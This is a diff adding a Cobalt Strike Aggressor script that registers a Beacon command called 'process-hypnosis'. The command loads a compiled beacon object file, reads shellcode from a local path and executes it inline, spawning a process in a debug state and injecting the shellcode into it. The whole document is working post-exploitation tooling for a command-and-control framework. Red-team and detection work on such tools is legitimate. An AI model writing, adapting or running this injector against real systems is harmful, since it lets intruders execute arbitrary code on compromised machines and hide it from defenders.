@@ -1,0 +1,28 @@
+beacon_command_register(
+    "process-hypnosis", 
+    "Process Hypnosis - Spawns a process in a debug state and injects shellcode", 
+    "Synopsis: process-hypnosis /local/path/to/shellcode.bin"
+);
+
+alias process-hypnosis{
+    if(size(@_) != 2)
+    {
+        berror($1, "Incorrect usage!");
+        berror($1, beacon_command_detail("process-hypnosis"));
+        return;
+    }
+    local('$handle $data $args');
+    $handle = openf(script_resource("bof.o"));
+    $data = readb($handle, -1);
+    closef($handle);
+
+    $sc_handle = openf($2);
+        $sc_data = readb($sc_handle, -1);
+        closef($sc_handle);
+
+    $args = bof_pack($1,"b",$sc_data);
+    btask($1, "Process Hypnosis - Process Shellcode Injector ");
+    btask($1, "Reading shellcode from: $+  $2");
+
+    beacon_inline_execute($1, $data, "go", $args);
+}
